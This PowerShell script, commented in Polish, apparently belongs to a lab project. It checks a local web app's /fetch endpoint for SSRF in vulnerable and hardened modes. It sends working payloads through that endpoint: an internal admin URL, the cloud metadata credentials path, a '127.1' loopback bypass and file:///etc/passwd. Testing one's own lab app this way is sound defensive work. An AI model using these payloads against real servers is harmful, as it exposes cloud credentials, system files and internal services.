# run-evidence.ps1 - zbiera dowody dla projektu P8 (SSRF)
# Odpala scenariusze ataku przez endpoint /fetch i zapisuje wyniki do evidence\<tryb>\
# Dziala w obu trybach: VULNERABLE=1 (BEFORE) i VULNERABLE=0 (AFTER) - tryb wykrywa sam.
#
# Uzycie (z folderu projektu, przy uruchomionym "docker compose up"):
#   powershell -ExecutionPolicy Bypass -File .\run-evidence.ps1

$base = "http://localhost:8080"

# --- wykryj tryb aplikacji z /health ---
try {
    $mode = (curl.exe -s "$base/health" | ConvertFrom-Json).mode
} catch {
    Write-Host "Nie moge polaczyc sie z $base - czy dziala 'docker compose up'?" -ForegroundColor Red
    exit 1
}

$outdir = Join-Path $PSScriptRoot "evidence\$mode"
New-Item -ItemType Directory -Force -Path $outdir | Out-Null

# --- scenariusze ---
# Oczekiwanie: BEFORE (vulnerable) = atak przechodzi; AFTER (hardened) = HTTP 403.
$tests = @(
    @{ id="T1";  desc="Usluga wewnetrzna /admin";                 url="http://internal-api/admin" }
    @{ id="T2";  desc="Serwis metadanych (token)";                url="http://169.254.169.254/latest/meta-data/iam/security-credentials/demo-role" }
    @{ id="T3";  desc="Loopback - alternatywny zapis 127.1";      url="http://127.1/" }
    @{ id="T6";  desc="Odczyt lokalnego pliku file://";           url="file:///etc/passwd" }
    @{ id="T7";  desc="KONTROLNY - legalny URL z allowlisty";     url="http://example-cdn.local/" }
    # gopher:// pominiete celowo: klient 'requests' nie obsluguje tego schematu,
    #   wiec to kontrola prewencyjna (allowlista schematow), nie realna podatnosc - opis w raporcie.
    # T4 (przekierowanie 302) i T5 (DNS rebinding) wymagaja dodatkowego serwera atakujacego -
    #   do dopisania przez osobe od poprawki.
)

$lines = @()
$lines += "=== Dowody SSRF - tryb: $mode ==="
$lines += "Data: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
$lines += ""

foreach ($t in $tests) {
    $enc = [uri]::EscapeDataString($t.url)
    $bodyFile = Join-Path $outdir "$($t.id).txt"
    # -s cicho, -o zapis tresci, -w kod HTTP; curl.exe nie rzuca bledem na 403
    $code = curl.exe -s -o $bodyFile -w "%{http_code}" "$base/fetch?url=$enc"
    $body = ""
    if (Test-Path $bodyFile) { $body = (Get-Content $bodyFile -Raw).Trim() }
    $short = if ($body.Length -gt 140) { $body.Substring(0,140) + "..." } else { $body }

    $lines += ("[{0}] HTTP {1}  {2}" -f $t.id, $code, $t.desc)
    $lines += ("      url : {0}" -f $t.url)
    $lines += ("      tresc: {0}" -f $short)
    $lines += ""
}

$summaryPath = Join-Path $outdir "summary.txt"
$lines | Set-Content -Encoding UTF8 $summaryPath
$lines | ForEach-Object { Write-Host $_ }
Write-Host ""
Write-Host "Zapisano dowody do: $outdir" -ForegroundColor Green
Write-Host "  - summary.txt  (tabela zbiorcza)"
Write-Host "  - T*.txt       (pelna odpowiedz kazdego testu)"
